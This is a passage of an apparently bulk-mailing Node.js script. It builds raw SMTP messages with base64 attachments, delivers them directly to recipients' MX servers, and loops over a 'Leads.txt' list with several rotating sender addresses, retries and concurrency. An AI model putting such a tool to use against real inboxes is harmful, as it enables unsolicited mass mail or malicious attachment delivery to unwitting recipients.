      `Content-Type: application/octet-stream; name="${attachmentFilename}"`,
      `Content-Transfer-Encoding: base64`,
      `Content-Disposition: attachment; filename="${attachmentFilename}"`,
      '',
      encodedAttachment
    );
  } catch (error) {
    console.error(`Error reading and processing attachment file: ${error}`);
  }
}

commands.push(
  `--${boundary}--`,
  '',
  '.',
  `QUIT`
);


  let commandIndex = 0;

  client.on('data', (data) => {
    console.log('Received:', data); 
  });

  client.on('error', (error) => {
    console.error(`Error connecting to ${mxRecord.exchange}:`, error);
  });

  client.on('close', () => {
    console.log(`Connection closed with ${mxRecord.exchange}`);
  });

  client.on('connect', () => {
    sendNextCommand(client, commands, commandIndex);
  });
}

function sendNextCommand(client, commands, commandIndex) {
  if (commandIndex < commands.length) {
    const command = commands[commandIndex];
    console.log('Sending:', command);
    client.write(command + '\r\n', () => {
      sendNextCommand(client, commands, commandIndex + 1);
    });
  }
}



async function sendEmails(recipientAddresses, senderAddress) {
  const limit = pLimit(options.concurrencyLimit);
  const failedEmails = [];

  const sendTasks = recipientAddresses.map((recipientAddress) => {
    const sendEmailFunction = async () => {
      for (let attempt = 1; attempt <= MAX_RETRIES; attempt++) {
        try {
          if (options.method === 'SMTP') {
            await sendEmailViaSMTP(recipientAddress, senderAddress);
          } else if (options.method === 'MX') {
            await sendEmailViaMX(recipientAddress, senderAddress);
          } else {
            console.error('Invalid sending method');
            throw new Error('Invalid sending method');
          }
          console.log(`Email successfully sent to ${recipientAddress} from ${senderAddress}`);
          await logSuccess(recipientAddress);
          return `Success: ${recipientAddress}`;
        } catch (error) {
          console.error(`Attempt ${attempt} failed for ${recipientAddress}:`, error.message);
          if (attempt === MAX_RETRIES) {
            failedEmails.push(recipientAddress);
            await logFailure(recipientAddress);
          }
        }
      }
    };

    return options.useConcurrency ? limit(sendEmailFunction) : sendEmailFunction();
  });

  try {
    const results = await Promise.all(sendTasks);
    console.log('Email sending results:', results);
    if (failedEmails.length > 0) {
      console.error(`Failed to send emails to the following addresses after ${MAX_RETRIES} attempts:`, failedEmails);
    }
  } catch (error) {
    console.error('Error during email sending:', error);
  }
}


async function startSendingEmails() {
  try {
    await resetLogFiles();
    const recipientAddresses = await getRecipientAddresses('Leads.txt');

    for (const senderAddress of senderAddresses) {
      console.log(`Sending emails from ${senderAddress}`);
      await sendEmails(recipientAddresses, senderAddress); 
    }
  } catch (error) {
    console.error('Failed to start sending emails:', error);
  }
}

startSendingEmails();
